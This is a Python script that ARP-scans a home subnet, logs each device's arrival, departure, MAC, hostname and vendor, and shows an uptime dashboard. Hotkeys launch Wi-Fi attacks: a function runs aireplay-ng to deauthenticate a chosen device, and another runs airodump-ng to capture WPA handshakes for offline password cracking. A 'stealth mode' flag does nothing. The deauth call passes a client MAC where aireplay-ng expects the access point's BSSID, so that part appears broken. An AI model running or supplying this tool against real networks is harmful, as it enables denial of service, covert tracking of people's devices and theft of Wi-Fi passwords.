import subprocess
import scapy.all as scapy
import socket
import threading
import time
import logging
from logging.handlers import TimedRotatingFileHandler
from colorama import Fore, Back, Style, init
from datetime import datetime, timedelta
from collections import defaultdict
import os
import csv
import keyboard
import random

monitor_iface = "wlan0mon"
handshake_dir = "handshakes"
stealth_mode = False

def toggle_stealth():
    global stealth_mode
    stealth_mode = not stealth_mode
    print(f"{Fore.MAGENTA}[ * ] Stealth mode {'ENABLED' if stealth_mode else 'DISABLED'}{Style.RESET_ALL}")

def list_devices_snapshot():
    print(f"{Fore.YELLOW}[ Devices Snapshot ]{Style.RESET_ALL}")
    for ip in online_since:
        mac = mac_by_ip.get(ip, "N/A")
        hostname = hostname_cache.get(ip, "Unresolved")
        print(f"{ip:<15} | {mac:<17} | {hostname}")

def deauth_target():
    target_ip = input("Enter target IP to deauth: ").strip()
    mac = mac_by_ip.get(target_ip)
    if not mac:
        print("MAC not found.")
        return
    print(f"[!] Sending deauth to {target_ip} ({mac})...")
    subprocess.Popen(["aireplay-ng", "--deauth", "5", "-a", mac, monitor_iface],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def capture_handshake():
    bssid = input("Enter BSSID to capture handshake: ").strip()
    channel = input("Enter Channel: ").strip()
    out_file = os.path.join(handshake_dir, f"handshake_{bssid.replace(':','')}_{random.randint(1000,9999)}.cap")
    print(f"[!] Capturing WPA handshake on {bssid} (Channel {channel})...")

    subprocess.Popen(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", out_file, monitor_iface],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def hotkey_listener():
    keyboard.add_hotkey('q', lambda: exit(0))
    keyboard.add_hotkey('d', deauth_target)
    keyboard.add_hotkey('h', capture_handshake)
    keyboard.add_hotkey('s', toggle_stealth)
    keyboard.add_hotkey('l', list_devices_snapshot)
    print(f"{Fore.CYAN}[ HOTKEYS READY ] Press 'q' to quit, 'd' for deauth, 'h' to capture, 's' to toggle stealth, 'l' to list devices{Style.RESET_ALL}")
    keyboard.wait()  # Keeps thread alive


# Try importing full vendor database, fallback to built-in minimal set
try:
    from resources.mac_vendors import MAC_VENDOR_PREFIXES
except ImportError:
    MAC_VENDOR_PREFIXES = {
        "b8:be:f4": "Apple, Inc.",
        "1c:b0:44": "Cisco Systems",
        "00:1a:2b": "Intel Corporation",
        "ac:de:48": "Samsung Electronics",
        "3c:5a:b4": "Amazon Technologies",
        "50:6b:4b": "Google, Inc.",
        "fc:fb:fb": "Cisco Systems",
    }

def guess_os_from_mac(mac):
    """
    Attempts to map a MAC prefix to a known vendor (used as OS hint).
    Handles common MAC formatting issues gracefully.
    """
    if not mac or len(mac) < 8:
        return "Unknown"
    normalized = mac.lower().replace('-', ':')
    parts = normalized.split(':')
    if len(parts) < 3:
        return "Unknown"
    prefix = ':'.join(parts[:3])
    return MAC_VENDOR_PREFIXES.get(prefix, "Unknown")

init(autoreset=True)

CSV_LOG = "wifi.log"              # unified log file with uptime_seconds column
mon_interval = 2  # seconds between scans

# State
total_uptime = defaultdict(timedelta)   # ip -> total time joined
online_since = {}                       # ip -> datetime
hostname_cache = {}                     # ip -> hostname
mac_by_ip = {}                          # ip -> mac
os_cache = {}                          # ip -> os/vendor info

def parse_logs_for_uptime():
    """
    Reconstruct total_uptime and online_since from the wifi.log file.
    """
    if not os.path.isfile(CSV_LOG):
        return

    joins = {}  # ip -> datetime join time
    total_uptime.clear()
    online_since.clear()

    with open(CSV_LOG, newline='', encoding="utf-8") as f:
        reader = csv.reader(f, delimiter=';')
        next(reader, None)  # skip header
        for row in reader:
            if len(row) < 6:
                continue
            timestamp_str, event, ip, mac, hostname, os_info = row[:6]
            try:
                ts = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
            except Exception:
                continue

            os_cache[ip] = os_info
            mac_by_ip[ip] = mac
            hostname_cache[ip] = hostname

            if event == "JOIN":
                joins[ip] = ts
            elif event == "LEAVE":
                if ip in joins:
                    duration = ts - joins[ip]
                    total_uptime[ip] += duration
                    joins.pop(ip, None)

    now = datetime.now()
    for ip, join_time in joins.items():
        total_uptime[ip] += now - join_time
        online_since[ip] = join_time

def setup_logger():
    if not os.path.exists(CSV_LOG):
        with open(CSV_LOG, "w", encoding="utf-8") as f:
            f.write("timestamp;event;ip;mac;hostname;os;uptime_seconds\n")

    logger = logging.getLogger("NetworkMonitor")
    logger.setLevel(logging.INFO)

    file_handler = TimedRotatingFileHandler(CSV_LOG, when="W0", interval=1, backupCount=4, encoding="utf-8")
    file_formatter = logging.Formatter('%(asctime)s;%(message)s', datefmt="%Y-%m-%d %H:%M:%S")
    file_handler.setFormatter(file_formatter)

    if not logger.handlers:
        logger.addHandler(file_handler)

    return logger

def log_event(event_type, ip, mac, hostname, uptime_seconds=None):
    os_info = guess_os_from_mac(mac)
    os_cache[ip] = os_info
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    uptime_str = str(uptime_seconds) if uptime_seconds is not None and uptime_seconds != "" else "None"
    log_line = f"{timestamp};{event_type};{ip};{mac};{hostname};{os_info};{uptime_str}"
    with open(CSV_LOG, 'a+', encoding='utf-8') as f:
        f.write(log_line + '\n')

    # Minimal on-screen output for stealth
    if event_type == "JOIN":
        label = "[ + ]"
        status = "JOIN"
    else:
        label = "[ - ]"
        status = "LEAVE"

    # Printing only essential info with no color
    print(f"{label} {timestamp:<20} | {status:<6} | IP: {ip:<15} | MAC: {mac:<17} | Host: {hostname:<20} | OS: {os_info}")

def scan_network(ip_range):
    """
    Perform a network scan using ARP requests. Stealth mode with minimal output.
    """
    arp = scapy.ARP(pdst=ip_range)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    answered = scapy.srp(packet, timeout=1, verbose=False)[0]  # Setting verbose=False for stealth
    return [{"ip": rcv.psrc, "mac": rcv.hwsrc} for _, rcv in answered]

def get_hostname(ip):
    if ip in hostname_cache:
        return hostname_cache[ip]
    try:
        hostname = socket.gethostbyaddr(ip)[0]
    except socket.herror:
        hostname = "Unresolved"
    hostname_cache[ip] = hostname
    return hostname

def format_td(td):
    s = int(td.total_seconds())
    h, rem = divmod(s, 3600)
    m, s = divmod(rem, 60)
    return f"{h}h{m:02d}m{s:02d}s"

def display_status():
    last_snapshot = {}

    while True:
        time.sleep(5)
        now = datetime.now()

        uptime_snapshot = {}
        for ip in set(list(total_uptime.keys()) + list(online_since.keys())):
            base = total_uptime[ip]
            if ip in online_since:
                base += now - online_since[ip]
            uptime_snapshot[ip] = base

        # Only refresh screen if something has changed
        if uptime_snapshot != last_snapshot:
            os.system("cls" if os.name == "nt" else "clear")
            print(f"\n{Fore.BLUE}{'=' * 100}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{Back.BLACK}[ DASHBOARD ] Device Uptime Summary ({now.strftime('%H:%M:%S')}){Style.RESET_ALL}\n")

            sorted_uptime = sorted(uptime_snapshot.items(), key=lambda x: x[1], reverse=True)
            half = len(sorted_uptime) // 2 or 1
            most_active = sorted_uptime[:half]
            least_active = sorted_uptime[half:]

            def get_info(ip):
                hostname = hostname_cache.get(ip, "Unresolved")
                mac = mac_by_ip.get(ip, "N/A")
                uptime = format_td(uptime_snapshot[ip])
                os_info = os_cache.get(ip, "Unknown")
                status = Fore.LIGHTGREEN_EX + "ONLINE" if ip in online_since else Fore.LIGHTRED_EX + "OFFLINE"
                return hostname, mac, uptime, status, os_info

            print(f"{Fore.LIGHTGREEN_EX} MOST ACTIVE DEVICES {Style.RESET_ALL}")
            print(f"{'IP':<18} {'MAC':<20} {'Hostname':<28} {'Uptime':>12} {'Status':>10} {'OS/Vendor':<20}")
            print("-" * 110)
            for ip, _ in most_active:
                hostname, mac, uptime, status, os_info = get_info(ip)
                print(f"{ip:<18} {mac:<20} {hostname:<28} {uptime:>12} {status:>10} {os_info:<20}")

            print(f"\n{Fore.LIGHTRED_EX} LEAST ACTIVE DEVICES {Style.RESET_ALL}")
            print(f"{'IP':<18} {'MAC':<20} {'Hostname':<28} {'Uptime':>12} {'Status':>10} {'OS/Vendor':<20}")
            print("-" * 110)
            for ip, _ in least_active:
                hostname, mac, uptime, status, os_info = get_info(ip)
                print(f"{ip:<18} {mac:<20} {hostname:<28} {uptime:>12} {status:>10} {os_info:<20}")

            print(f"\n{Fore.BLUE}Updated at: {now.strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}\n")
            last_snapshot = uptime_snapshot.copy()


def monitor(ip_range):
    threading.Thread(target=display_status, daemon=True).start()

    while True:
        devices = scan_network(ip_range)
        now = datetime.now()
        seen_ips = set()

        for d in devices:
            ip = d["ip"]
            mac = d["mac"]
            seen_ips.add(ip)
            mac_by_ip[ip] = mac
            hostname = get_hostname(ip)
            os_cache[ip] = guess_os_from_mac(mac)

            if ip not in online_since:
                online_since[ip] = now
                log_event("JOIN", ip, mac, hostname)

        for ip in list(online_since.keys()):
            if ip not in seen_ips:
                duration = now - online_since.pop(ip)
                total_uptime[ip] += duration
                uptime_sec = int(duration.total_seconds())
                log_event("LEAVE", ip, mac_by_ip.get(ip, "N/A"), hostname_cache.get(ip, "Unresolved"), uptime_seconds=uptime_sec)

        time.sleep(mon_interval)

if __name__ == "__main__":
    if not os.path.exists(handshake_dir):
        os.makedirs(handshake_dir)

    threading.Thread(target=hotkey_listener, daemon=True).start()
    setup_logger()
    parse_logs_for_uptime()
    subnet = "192.168.1.1/24"
    print(f"Monitoring {subnet}...\n")
    monitor(subnet)
    
